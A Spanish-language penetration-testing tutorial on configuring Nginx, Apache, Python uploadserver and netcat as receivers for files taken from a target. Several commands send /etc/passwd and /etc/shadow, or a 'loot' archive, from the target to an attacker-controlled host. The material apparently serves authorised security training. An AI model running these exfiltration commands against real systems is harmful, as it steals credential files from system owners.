# Recibir Archivos vía HTTP/S

Además de usar servidores Python básicos, en algunas situaciones se necesita más control sobre cómo se reciben los archivos — soporte HTTPS, autenticación, rutas específicas. Nginx y Apache permiten configurar un receptor de uploads robusto.

### Nginx como receptor de uploads

Nginx es especialmente útil porque se puede configurar para aceptar uploads a una ruta específica sin necesitar módulos adicionales, y su configuración es muy granular.

#### Configuración básica para recibir uploads

```bash
# Crear el directorio donde se guardarán los archivos recibidos
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Crear el archivo de configuración `/etc/nginx/sites-available/upload.conf`:

```nginx
server {
    listen 9001;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
# Activar el sitio y reiniciar Nginx
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx

# Verificar que está escuchando
ss -lnpt | grep 9001
```

#### Subir archivos con cURL (método PUT)

```bash
# Desde el objetivo — subir un archivo
curl -T /etc/passwd http://192.168.1.100:9001/SecretUploadDirectory/passwd

# Verificar que llegó
tail -1 /var/log/nginx/access.log
ls -la /var/www/uploads/SecretUploadDirectory/
```

### Nginx con HTTPS

Para cifrar la transferencia con un certificado autofirmado:

```bash
# Generar certificado
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/nginx/ssl/nginx.key \
    -out /etc/nginx/ssl/nginx.crt \
    -subj "/CN=upload-server"
```

```nginx
server {
    listen 443 ssl;
    ssl_certificate     /etc/nginx/ssl/nginx.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx.key;

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

```bash
# Subir con HTTPS (--insecure para cert autofirmado)
curl -k -T /etc/shadow https://192.168.1.100/SecretUploadDirectory/shadow
```

### Python uploadserver (HTTPS)

La opción más rápida de desplegar. Ver también la página de [Transferencias Protegidas](https://claude.ai/chat/05-protected.md) para la configuración completa.

```bash
pip3 install uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
sudo python3 -m uploadserver 443 --server-certificate server.pem

# Subir desde el objetivo
curl -k -X POST https://192.168.1.100/upload -F 'files=@/etc/passwd'
```

### Apache como receptor

Apache también puede configurarse para aceptar uploads, aunque requiere el módulo `mod_dav`.

```bash
sudo apt install apache2
sudo a2enmod dav dav_fs
sudo mkdir -p /var/www/html/uploads
sudo chown www-data:www-data /var/www/html/uploads
```

Añadir en `/etc/apache2/sites-available/000-default.conf`:

```apache
<Directory /var/www/html/uploads>
    Dav On
    Options None
    AuthType None
    Require all granted
</Directory>
```

```bash
sudo systemctl restart apache2

# Subir con cURL
curl -T archivo.zip http://192.168.1.100/uploads/archivo.zip
```

### Netcat como receptor simple

Para transferencias únicas sin necesidad de servidor HTTP:

```bash
# Receptor — escuchar y guardar todo lo que llega
nc -lvnp 8080 > archivo_recibido.zip

# Emisor — enviar el archivo
nc -q 0 192.168.1.100 8080 < loot.zip

# Con Ncat (cifrado)
ncat --recv-only -lvnp 8080 --ssl > archivo_recibido.zip
ncat --send-only 192.168.1.100 8080 --ssl < loot.zip
```

### Comparativa de receptores

| Receptor                  | Setup       | HTTPS         | Auth     | Persistente |
| ------------------------- | ----------- | ------------- | -------- | ----------- |
| `python3 -m uploadserver` | 1 comando   | Sí (con cert) | No       | No          |
| Nginx + DAV               | Config file | Sí            | Opcional | Sí          |
| Apache + mod\_dav         | Config file | Sí            | Opcional | Sí          |
| Netcat                    | 1 comando   | No (Ncat sí)  | No       | No          |

> Para la mayoría de engagements, `python3 -m uploadserver` con HTTPS es la solución más rápida. Nginx o Apache son preferibles si se necesita el receptor activo durante varios días o si se esperan múltiples archivos de distintos sistemas comprometidos.

> Un servidor de uploads accesible desde internet sin autenticación es un riesgo operacional. Si el servidor atacante tiene IP pública, proteger siempre el endpoint con autenticación o limitando el acceso por IP para evitar que terceros suban o descarguen archivos.
